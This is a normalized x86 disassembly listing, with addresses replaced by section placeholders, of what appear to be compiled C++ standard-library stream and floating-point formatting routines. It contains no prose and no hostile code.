call sub_402d50
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
or eax 0x4
sub_408340
push ebp
mov ebp esp
push 0xffffffff
push sub_4522ca
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov [ ebp - 0x14 ] esi
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + esi + 0x38 ]
xor edi edi
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x20 ] esi
cmp ecx edi
je r-xdata
mov [ ebp - 0x4 ] edi
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
cmp [ eax + esi + 0xc ] edi
jne r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
call eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
cmp [ eax + esi + 0xc ] edi
sete cl
mov [ ebp - 0x1c ] cl
mov ebx 0x1
mov [ ebp - 0x4 ] ebx
test cl cl
jne r-xdata
mov eax [ eax + esi + 0x3c ]
cmp eax edi
je r-xdata
mov [ ebp - 0x4 ] 0x2
mov ecx [ eax + esi + 0x38 ]
mov edx [ ecx + 0x24 ]
cmp [ edx ] 0x0
je r-xdata
lea edi [ ebx + 0x3 ]
jmp r-xdata
mov ecx eax
call sub_403670
mov eax [ ecx ]
mov edx [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
push edx
call eax
movzx eax ax
mov eax [ ecx + 0x34 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov edi 0x4
dec [ eax ]
mov ecx [ ecx + 0x24 ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
mov ecx [ ebp + 0x8 ]
mov [ eax ] cx
movzx eax cx
jmp r-xdata
mov [ ebp - 0x4 ] 0x4
call j_sub_43d14a
test al al
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ecx 0xffff
cmp cx ax
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
mov ecx [ edx + esi + 0x38 ]
test ecx ecx
je r-xdata
mov ecx esi
call sub_404650
push 0x0
push eax
call sub_402d50
or eax 0x4
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
call edx
sub_40841d
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
mov ecx [ edx + 0x4 ]
add ecx eax
mov eax [ ecx + 0xc ]
or eax 0x4
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ebx 0x1
push ebx
push eax
call sub_402d50
mov [ ebp - 0x4 ] ebx
mov eax r-xdata
retn
or eax 0x4
sub_4084c0
push ebp
mov ebp esp
and esp 0xfffffff8
mov eax [ ecx ]
mov eax [ eax + 0x18 ]
push edx
mov edx [ ebp + 0xc ]
push edx
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp + 0x14 ]
push edx
mov edx [ ebp + 0x10 ]
push edx
push esi
call eax
mov eax esi
mov esp ebp
pop ebp
retn 0x10
sub_4084f0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_4519e0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x60
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x58 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x70 ]
mov [ fs : 0x0 ] eax
movzx eax [ ebp + 0x18 ]
mov ebx [ ebp + 0x14 ]
test [ ebx + 0x14 ] 0x4000
mov esi [ ebp + 0x8 ]
mov [ esp + 0x1c ] esi
mov [ esp + 0x14 ] eax
jne r-xdata
lea eax [ esp + 0x18 ]
push eax
mov ecx ebx
call sub_402e50
mov edi eax
mov [ esp + 0x78 ] 0x0
call sub_40a480
mov [ esp + 0x78 ] 0xffffffff
mov edi [ esp + 0x18 ]
mov [ esp + 0x20 ] eax
test edi edi
je r-xdata
movzx edi [ ebp + 0x1c ]
mov edx [ ecx ]
mov edx [ edx + 0x1c ]
push edi
push eax
mov eax [ ebp + 0x10 ]
push ebx
push eax
mov eax [ ebp + 0xc ]
push eax
push esi
call edx
mov eax esi
jmp r-xdata
xor ecx ecx
mov [ esp + 0x44 ] 0x7
mov [ esp + 0x40 ] 0x0
mov [ esp + 0x30 ] cx
cmp [ ebp + 0x1c ] 0x0
mov [ esp + 0x78 ] 0x1
mov ecx [ esp + 0x20 ]
lea esi [ esp + 0x4c ]
je r-xdata
push 0x0
lea ecx [ esp + 0x2c ]
call sub_436188
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ esp + 0x70 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x58 ]
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn 0x18
call sub_409820
mov edi eax
lea esi [ esp + 0x30 ]
mov [ esp + 0x78 ] 0x3
call sub_4023e0
mov [ esp + 0x78 ] 0x1
cmp [ esp + 0x60 ] 0x8
jb r-xdata
call sub_427a10
mov edi eax
lea esi [ esp + 0x30 ]
mov [ esp + 0x78 ] 0x2
call sub_4023e0
mov [ esp + 0x78 ] 0x1
cmp [ esp + 0x60 ] 0x8
jb r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ esp + 0x28 ]
not esi
call sub_4361b0
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov esi [ ebx + 0x20 ]
mov eax [ esp + 0x40 ]
xor edi edi
cmp [ ebx + 0x24 ] edi
jl r-xdata
mov eax [ esp + 0x4c ]
push eax
mov edx [ esp + 0x4c ]
push edx
jmp r-xdata
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
dec eax
mov [ edi + 0x4 ] eax
xor esi esi
jg r-xdata
call sub_43811c
add esp 0x4
cmp [ esp + 0x44 ] 0x8
mov ecx [ esp + 0x30 ]
jae r-xdata
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push edx
push eax
lea ecx [ esp + 0x30 ]
mov eax esi
mov esi [ esp + 0x1c ]
push ecx
call sub_4097b0
mov edx [ eax ]
mov [ ebp + 0xc ] edx
mov eax [ eax + 0x4 ]
add esp 0xc
mov [ ebp + 0x10 ] eax
mov eax [ esp + 0x40 ]
xor esi esi
cmp esi eax
jbe r-xdata
cmp esi edi
jbe r-xdata
mov edx [ ebp + 0x10 ]
push edx
mov edx [ ebp + 0xc ]
push edx
lea edx [ esp + 0x28 ]
push edx
call sub_409740
mov ecx [ eax ]
add esp 0xc
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
push eax
mov [ ebx + 0x20 ] edi
mov [ ebx + 0x24 ] edi
mov ebx [ esp + 0x20 ]
mov [ ebp + 0x10 ] eax
push ecx
mov eax esi
mov esi [ esp + 0x1c ]
push ebx
call sub_4097b0
add esp 0xc
cmp [ esp + 0x44 ] 0x8
jb r-xdata
lea ecx [ esp + 0x30 ]
sub esi eax
jmp r-xdata
mov eax ebx
mov eax [ esp + 0x30 ]
push eax
call sub_43811c
add esp 0x4
mov ecx [ ebx + 0x14 ]
and ecx 0x1c0
cmp ecx 0x40
je r-xdata
sub_408730
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x54
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x50 ] eax
mov eax [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0x14 ]
mov edx [ ebx + 0x14 ]
push esi
mov esi [ ebp + 0x8 ]
push edi
push eax
mov eax [ ebp + 0x1c ]
mov [ esp + 0x10 ] ecx
mov ecx [ ebp + 0xc ]
push ecx
push eax
mov edi r--data
lea eax [ esp + 0x1c ]
call sub_427640
push eax
lea ecx [ esp + 0x28 ]
push 0x40
push ecx
call sub_438b97
mov ecx [ ebp + 0x18 ]
add esp 0x10
lea edx [ esp + 0x20 ]
push edx
mov edx [ esp + 0x18 ]
push ecx
push esi
push edx
mov edx eax
mov ecx ebx
call sub_4094a0
mov ecx [ esp + 0x74 ]
add esp 0x18
pop edi
mov eax esi
pop esi
pop ebx
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn 0x18
sub_4087b0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x54
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x50 ] eax
mov eax [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0x14 ]
mov edx [ ebx + 0x14 ]
push esi
mov esi [ ebp + 0x8 ]
push edi
push eax
mov eax [ ebp + 0x1c ]
mov [ esp + 0x10 ] ecx
mov ecx [ ebp + 0xc ]
push ecx
push eax
mov edi r--data
lea eax [ esp + 0x1c ]
call sub_427640
push eax
lea ecx [ esp + 0x28 ]
push 0x40
push ecx
call sub_438b97
mov ecx [ ebp + 0x18 ]
add esp 0x10
lea edx [ esp + 0x20 ]
push edx
mov edx [ esp + 0x18 ]
push ecx
push esi
push edx
mov edx eax
mov ecx ebx
call sub_4094a0
mov ecx [ esp + 0x74 ]
add esp 0x18
pop edi
mov eax esi
pop esi
pop ebx
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn 0x18
sub_408830
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x54
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x50 ] eax
mov eax [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0x14 ]
mov edx [ ebx + 0x14 ]
push esi
mov esi [ ebp + 0x8 ]
push edi
push eax
mov eax [ ebp + 0x20 ]
mov [ esp + 0x10 ] ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x1c ]
push eax
push ecx
mov edi r--data
lea eax [ esp + 0x20 ]
call sub_427640
push eax
lea edx [ esp + 0x2c ]
push 0x40
push edx
call sub_438b97
mov edx [ ebp + 0x18 ]
add esp 0x14
lea ecx [ esp + 0x20 ]
push ecx
mov ecx [ esp + 0x18 ]
push edx
push esi
push ecx
mov edx eax
mov ecx ebx
call sub_4094a0
mov ecx [ esp + 0x74 ]
add esp 0x18
pop edi
mov eax esi
pop esi
pop ebx
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn 0x1c
sub_4088c0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x54
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x50 ] eax
mov eax [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0x14 ]
mov edx [ ebx + 0x14 ]
push esi
mov esi [ ebp + 0x8 ]
push edi
push eax
mov eax [ ebp + 0x20 ]
mov [ esp + 0x10 ] ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x1c ]
push eax
push ecx
mov edi r--data
lea eax [ esp + 0x20 ]
call sub_427640
push eax
lea edx [ esp + 0x2c ]
push 0x40
push edx
call sub_438b97
mov edx [ ebp + 0x18 ]
add esp 0x14
lea ecx [ esp + 0x20 ]
push ecx
mov ecx [ esp + 0x18 ]
push edx
push esi
push ecx
mov edx eax
mov ecx ebx
call sub_4094a0
mov ecx [ esp + 0x74 ]
add esp 0x18
pop edi
mov eax esi
pop esi
pop ebx
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn 0x1c
sub_408950
push ebp
mov ebp esp
and esp 0xffffffc0
sub esp 0xb4
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xb0 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
push edi
mov [ esp + 0x38 ] eax
mov eax [ ebx + 0x1c ]
xor edi edi
mov [ esp + 0x3c ] ecx
mov ecx [ ebx + 0x18 ]
cmp eax edi
jg r-xdata
mov esi ecx
jl r-xdata
mov [ esp + 0x34 ] esi
jg r-xdata
test [ ebx + 0x14 ] 0x2000
jne r-xdata
cmp ecx edi
ja r-xdata
mov [ esp + 0x40 ] 0x25
lea eax [ esp + 0x41 ]
test dl 0x20
je r-xdata
fld [ r--data ]
fmul st1
fld st1
fucompp
fnstsw ax
test ah 0x44
jpo r-xdata
mov [ esp + 0x34 ] 0x24
jmp r-xdata
cmp esi 0x24
jbe r-xdata
mov esi 0x6
xor eax eax
jmp r-xdata
test dl 0x10
je r-xdata
mov [ esp + 0x41 ] 0x2b
lea eax [ esp + 0x42 ]
fldz
fcom st1
fnstsw ax
test ah 0x41
jne r-xdata
mov eax [ esp + 0x34 ]
fld [ ebp + 0x1c ]
cdq
sub esi eax
sbb ecx edx
mov edx [ ebx + 0x14 ]
mov eax edx
and eax 0x3000
mov [ esp + 0x30 ] edi
cmp eax 0x2000
jne r-xdata
mov ecx eax
cmp ecx edi
jl r-xdata
and edx 0x3000
mov [ eax ] 0x2a2e
cmp edx 0x2000
jne r-xdata
mov [ eax ] 0x23
inc eax
mov [ esp + 0x2f ] 0x0
fxch st1
fxch st1
mov [ esp + 0x2f ] 0x1
fchs
jmp r-xdata
cmp edx 0x3000
jne r-xdata
mov cl 0x66
jmp r-xdata
cmp [ esp + 0x30 ] 0x1388
jae r-xdata
fstp st1
jmp r-xdata
fld [ r--data ]
fcom st1
fnstsw ax
fld [ r--data ]
test ah 0x41
jpo r-xdata
cmp edx 0x1000
setne cl
lea ecx [ ecx + ecx + 0x65 ]
mov cl 0x61
jmp r-xdata
mov edx [ ebp + 0xc ]
mov [ eax + 0x2 ] cl
mov ecx [ ebp + 0x10 ]
push ecx
push edx
sub esp 0x8
fstp [ esp ]
mov [ eax + 0x3 ] 0x0
mov eax [ esp + 0x44 ]
push eax
lea ecx [ esp + 0x54 ]
push ecx
lea edx [ esp + 0x60 ]
push 0x6c
push edx
call sub_438b97
mov ecx [ ebp + 0x18 ]
mov edx [ esp + 0x5c ]
add esp 0x18
push eax
push esi
mov esi [ esp + 0x48 ]
push edi
lea eax [ esp + 0x5c ]
push eax
push ecx
push esi
push edx
mov edx [ esp + 0x54 ]
mov ecx ebx
call sub_408ed0
mov ecx [ esp + 0xe0 ]
add esp 0x24
pop edi
mov eax esi
pop esi
pop ebx
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn 0x1c
fdiv st2
add [ esp + 0x30 ] 0xa
fxch st1
fcom st2
fnstsw ax
test ah 0x41
jpo r-xdata
fxch st2
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fxch st1
fstp st0
cmp [ esp + 0x2f ] 0x0
fstp st1
je r-xdata
test ecx ecx
jl r-xdata
fchs
jg r-xdata
fld [ r--data ]
jmp r-xdata
cmp esi 0xa
jb r-xdata
fcom st1
fnstsw ax
test ah 0x1
jne r-xdata
fstp st0
jmp r-xdata
cmp edi 0x1388
jae r-xdata
add esi 0xfffffff6
fxch st1
adc ecx 0xffffffff
fmul st2
add edi 0xa
test ecx ecx
jg r-xdata
fxch st1
jl r-xdata
fstp st1
cmp esi 0xa
jae r-xdata
sub_408b70
push ebp
mov ebp esp
and esp 0xffffffc0
sub esp 0xb4
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xb0 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
push edi
mov [ esp + 0x38 ] eax
mov eax [ ebx + 0x1c ]
xor edi edi
mov [ esp + 0x3c ] ecx
mov ecx [ ebx + 0x18 ]
cmp eax edi
jg r-xdata
mov esi ecx
jl r-xdata
mov [ esp + 0x34 ] esi
jg r-xdata
test [ ebx + 0x14 ] 0x2000
jne r-xdata
cmp ecx edi
ja r-xdata
fld [ ebp + 0x1c ]
fldz
fld [ ebp + 0x1c ]
fcom st1
fnstsw ax
test ah 0x5
jpe r-xdata
mov [ esp + 0x34 ] 0x24
jmp r-xdata
cmp esi 0x24
jbe r-xdata
mov esi 0x6
xor eax eax
jmp r-xdata
test dl 0x10
je r-xdata
mov [ esp + 0x41 ] 0x2b
lea eax [ esp + 0x42 ]
mov [ esp + 0x2f ] 0x0
jmp r-xdata
mov [ esp + 0x2f ] 0x1
fchs
mov eax [ esp + 0x34 ]
cdq
sub esi eax
sbb ecx edx
mov edx [ ebx + 0x14 ]
mov eax edx
and eax 0x3000
mov [ esp + 0x30 ] edi
cmp eax 0x2000
jne r-xdata
mov ecx eax
cmp ecx edi
jl r-xdata
and edx 0x3000
mov [ eax ] 0x2a2e
mov [ eax + 0x2 ] 0x4c
cmp edx 0x2000
jne r-xdata
mov [ eax ] 0x23
inc eax
fld [ r--data ]
fcom st1
fnstsw ax
fld [ r--data ]
test ah 0x41
jpo r-xdata
cmp [ esp + 0x30 ] 0x1388
jae r-xdata
fstp st1
jmp r-xdata
cmp edx 0x3000
jne r-xdata
mov cl 0x66
jmp r-xdata
fdiv st2
add [ esp + 0x30 ] 0xa
fxch st1
fcom st2
fnstsw ax
test ah 0x41
jpo r-xdata
fxch st2
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
cmp edx 0x1000
setne cl
lea ecx [ ecx + ecx + 0x65 ]
mov cl 0x61
jmp r-xdata
mov edx [ ebp + 0xc ]
mov [ eax + 0x3 ] cl
mov ecx [ ebp + 0x10 ]
push ecx
push edx
sub esp 0x8
fstp [ esp ]
mov [ eax + 0x4 ] 0x0
mov eax [ esp + 0x44 ]
push eax
lea ecx [ esp + 0x54 ]
push ecx
lea edx [ esp + 0x60 ]
push 0x6c
push edx
call sub_438b97
mov ecx [ ebp + 0x18 ]
mov edx [ esp + 0x5c ]
add esp 0x18
push eax
push esi
mov esi [ esp + 0x48 ]
push edi
lea eax [ esp + 0x5c ]
push eax
push ecx
push esi
push edx
mov edx [ esp + 0x54 ]
mov ecx ebx
call sub_408ed0
mov ecx [ esp + 0xe0 ]
add esp 0x24
pop edi
mov eax esi
pop esi
pop ebx
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn 0x1c
fxch st1
fstp st0
cmp [ esp + 0x2f ] 0x0
fstp st1
je r-xdata
test ecx ecx
jl r-xdata
mov [ esp + 0x40 ] 0x25
lea eax [ esp + 0x41 ]
test dl 0x20
je r-xdata
fchs
jmp r-xdata
jg r-xdata
fld [ r--data ]
jmp r-xdata
cmp esi 0xa
jb r-xdata
fcom st1
fnstsw ax
test ah 0x1
jne r-xdata
fstp st0
jmp r-xdata
cmp edi 0x1388
jae r-xdata
add esi 0xfffffff6
fxch st1
adc ecx 0xffffffff
fmul st2
add edi 0xa
test ecx ecx
jg r-xdata
fxch st1
jl r-xdata
fstp st1
cmp esi 0xa
jae r-xdata
sub_408d80
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x4c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x48 ] eax
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
mov ecx [ ebp + 0x10 ]
push ecx
push edx
push eax
push r--data
lea eax [ esp + 0x20 ]
push 0x40
push eax
call sub_438b97
mov edx [ ebp + 0x18 ]
add esp 0x10
lea ecx [ esp + 0x18 ]
push ecx
push edx
push esi
push edi
mov edx eax
mov ecx ebx
call sub_4094a0
mov ecx [ esp + 0x6c ]
add esp 0x18
pop edi
mov eax esi
pop esi
pop ebx
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn 0x18
sub_408df0
push ebp
mov ebp esp
mov eax [ esi + 0x10 ]
cmp eax edi
jae r-xdata
mov ecx [ ebp + 0x8 ]
or edx 0xffffffff
sub edx eax
cmp edx ecx
ja r-xdata
push r--data
call sub_435ac6
test ecx ecx
je r-xdata
push r--data
call sub_435a79
mov eax esi
pop ebp
retn 0x8
push ebx
lea ebx [ eax + ecx ]
cmp ebx 0xfffffffe
jbe r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx ebx
jae r-xdata
push r--data
call sub_435a79
test ebx ebx
jne r-xdata
push eax
push ebx
mov ecx esi
call sub_405f00
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x10
jb r-xdata
mov [ esi + 0x10 ] ebx
cmp ecx 0x10
jb r-xdata
pop ebx
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov eax esi
mov [ eax ] 0x0
pop ebx
pop ebp
retn 0x8
mov eax [ esi ]
mov [ eax ] bl
pop ebx
mov eax esi
pop ebp
retn 0x8
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
mov eax esi
mov [ eax + ebx ] 0x0
mov eax [ esi ]
mov [ eax + ebx ] 0x0
pop ebx
mov eax esi
pop ebp
retn 0x8
mov edx [ esi + 0x10 ]
sub edx edi
push edx
add eax edi
add eax [ ebp + 0x8 ]
add ecx edi
push ecx
push eax
call sub_437db0
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
add esp 0xc
push eax
push ecx
push edi
mov ecx esi
call sub_409b40
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] ebx
jb r-xdata
sub_408ed0
push ebp
mov ebp esp
push 0xffffffff
push sub_45198b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x88
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0x14 ]
mov [ ebp - 0x58 ] edx
mov edx [ ebp + 0x1c ]
mov [ ebp - 0x6c ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x54 ] edx
mov [ ebp - 0x78 ] eax
mov eax [ ebp + 0x20 ]
lea edx [ ebp - 0x90 ]
push edx
mov [ ebp - 0x8c ] ecx
mov [ ebp - 0x50 ] eax
call sub_402e50
mov edi eax
mov [ ebp - 0x4 ] 0x0
call sub_40a480
mov edi eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x90 ]
mov [ ebp - 0x7c ] edi
test eax eax
je r-xdata
lea esi [ ebp - 0x4c ]
mov ecx edi
call sub_427c60
mov esi 0x1
mov [ ebp - 0x4 ] esi
mov eax [ edi ]
mov edx [ eax + 0x8 ]
mov ecx edi
call edx
movzx eax ax
xor edi edi
mov [ ebp - 0x70 ] eax
mov [ ebp - 0x1c ] 0xf
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x30 ] 0x0
mov ecx [ ebp - 0x6c ]
add ecx 0x8
push ecx
lea edx [ ebp - 0x68 ]
push edx
push esi
lea eax [ ebp - 0x60 ]
mov [ ebp - 0x4 ] 0x2
push eax
lea ecx [ ebp - 0x74 ]
push ecx
mov [ ebp - 0x60 ] 0x30
mov [ ebp - 0x74 ] edi
mov [ ebp - 0x68 ] edi
call sub_43640d
mov al [ ebx ]
add esp 0x14
cmp al 0x2b
je r-xdata
mov esi eax
push 0x0
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x70 ] esi
call sub_436188
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x68 ] esi
mov [ ebp - 0x68 ] edi
cmp al 0x2d
jne r-xdata
mov esi [ esi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x68 ]
not esi
call sub_4361b0
and esi [ ebp - 0x70 ]
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4c ]
mov ecx eax
cmp edx 0x10
jae r-xdata
mov [ ebp - 0x54 ] eax
call sub_438c6d
mov edx [ eax ]
mov edi [ ebp - 0x50 ]
mov al [ edx ]
push edi
push 0x65
push ebx
mov [ ebp - 0x64 ] al
mov [ ebp - 0x63 ] 0x65
call sub_438bc0
movsx ecx [ ebp - 0x64 ]
add esp 0xc
push edi
push ecx
push ebx
mov [ ebp - 0x5c ] eax
call sub_438bc0
mov esi eax
add esp 0xc
mov [ ebp - 0x84 ] esi
test esi esi
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
dec eax
mov [ esi + 0x4 ] eax
cmp [ ecx ] 0x7f
je r-xdata
lea ecx [ ebp - 0x4c ]
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x8c ]
lea eax [ edi + ecx ]
add eax [ ebp - 0x78 ]
mov ecx [ edx + 0x20 ]
add eax [ ebp - 0x58 ]
cmp [ edx + 0x24 ] 0x0
jl r-xdata
cmp edx 0x10
jae r-xdata
mov [ ebp - 0x5c ] 0x0
mov esi [ ebp - 0x5c ]
jg r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x4c ]
movsx eax [ ebp - 0x64 ]
push edi
push eax
push ebx
call sub_438bc0
add esp 0xc
test eax eax
je r-xdata
cmp edx 0x100
je r-xdata
cmp ecx eax
jbe r-xdata
test ecx ecx
je r-xdata
push edi
mov eax ebx
lea ecx [ ebp - 0x30 ]
call sub_409970
mov edi [ ebp - 0x5c ]
test edi edi
jne r-xdata
push edi
push 0x65
push ebx
call sub_438bc0
add esp 0xc
test eax eax
je r-xdata
mov ecx [ ebp + 0x28 ]
mov edx [ ebp + 0x24 ]
push ecx
sub eax ebx
lea edi [ eax + 0x1 ]
push edx
mov edx [ ebp - 0x6c ]
lea eax [ edi - 0x1 ]
push eax
mov eax [ ebp - 0x70 ]
lea ecx [ ebp - 0x88 ]
push ecx
push edx
mov ecx ebx
call sub_409c50
mov ecx [ eax ]
mov esi [ ebp - 0x74 ]
mov [ ebp + 0x24 ] ecx
mov edx [ eax + 0x4 ]
mov [ ebp + 0x28 ] edx
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
add esp 0x14
push ecx
push edx
lea eax [ ebp - 0x88 ]
push eax
mov eax [ ebp - 0x58 ]
call sub_4097b0
mov ecx [ eax ]
mov [ ebp + 0x24 ] ecx
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x7c ]
mov [ ebp + 0x28 ] edx
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
add esp 0xc
call edx
mov ecx [ ebp + 0x24 ]
movzx esi ax
mov eax [ ebp + 0x28 ]
push eax
push ecx
lea edx [ ebp - 0x80 ]
push edx
mov eax 0x1
call sub_4097b0
mov ecx [ eax ]
mov esi [ ebp - 0x74 ]
mov [ ebp + 0x24 ] ecx
mov edx [ eax + 0x4 ]
mov [ ebp + 0x28 ] edx
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
add esp 0xc
push ecx
push edx
lea eax [ ebp - 0x80 ]
push eax
mov eax [ ebp - 0x78 ]
call sub_4097b0
mov ecx [ eax ]
add ebx edi
add esp 0xc
sub [ ebp - 0x50 ] edi
mov edi [ ebp - 0x50 ]
mov [ ebp + 0x24 ] ecx
mov edx [ eax + 0x4 ]
mov [ ebp + 0x28 ] edx
cmp [ ebp - 0x68 ] 0x0
jbe r-xdata
mov edx [ ebp + 0x28 ]
mov eax [ ebp + 0x24 ]
push edx
push eax
lea ecx [ ebp - 0x88 ]
mov eax esi
mov esi [ ebp + 0x10 ]
push ecx
call sub_4097b0
mov edx [ eax ]
mov [ ebp + 0x24 ] edx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x28 ] eax
jmp r-xdata
sub ecx eax
mov esi ecx
mov [ ebp - 0x5c ] esi
jmp r-xdata
test esi esi
jne r-xdata
mov edx [ ebp - 0x54 ]
push 0x30
push edx
lea ecx [ ebp - 0x30 ]
call sub_409a90
jmp r-xdata
mov eax [ ebp + 0x28 ]
mov ecx [ ebp + 0x24 ]
push eax
mov eax [ ebp - 0x6c ]
push ecx
push edi
lea edx [ ebp - 0x80 ]
push edx
push eax
mov eax [ ebp - 0x70 ]
mov ecx ebx
call sub_409c50
mov ecx [ eax ]
mov esi [ ebp - 0x74 ]
mov [ ebp + 0x24 ] ecx
mov edx [ eax + 0x4 ]
mov [ ebp + 0x28 ] edx
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
add esp 0x14
push ecx
push edx
lea eax [ ebp - 0x80 ]
push eax
mov eax [ ebp - 0x54 ]
call sub_4097b0
mov ecx [ eax ]
mov edx [ ebp - 0x8c ]
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x10 ]
add esp 0xc
mov [ ebp + 0x24 ] ecx
mov eax [ eax + 0x4 ]
push eax
push ecx
mov [ ebp + 0x28 ] eax
mov eax [ ebp - 0x5c ]
xor ebx ebx
push edi
mov [ edx + 0x20 ] ebx
mov [ edx + 0x24 ] ebx
call sub_4097b0
mov esi 0x10
add esp 0xc
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov ecx [ ebp + 0x24 ]
sub eax ebx
lea edi [ eax + 0x1 ]
mov eax [ ebp + 0x28 ]
push eax
push ecx
mov ecx [ ebp - 0x6c ]
lea edx [ edi - 0x1 ]
push edx
lea eax [ ebp - 0x80 ]
push eax
mov eax [ ebp - 0x70 ]
push ecx
mov ecx ebx
call sub_409c50
mov edx [ eax ]
mov esi [ ebp - 0x74 ]
mov [ ebp + 0x24 ] edx
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x28 ] ecx
mov edx [ eax + 0x4 ]
mov eax [ eax ]
add esp 0x14
push edx
push eax
mov eax [ ebp - 0x54 ]
lea ecx [ ebp - 0x80 ]
push ecx
call sub_4097b0
mov edx [ eax ]
mov [ ebp + 0x24 ] edx
mov ecx [ eax + 0x4 ]
mov edx [ ebp - 0x8c ]
add esp 0xc
test [ edx + 0x14 ] 0x4
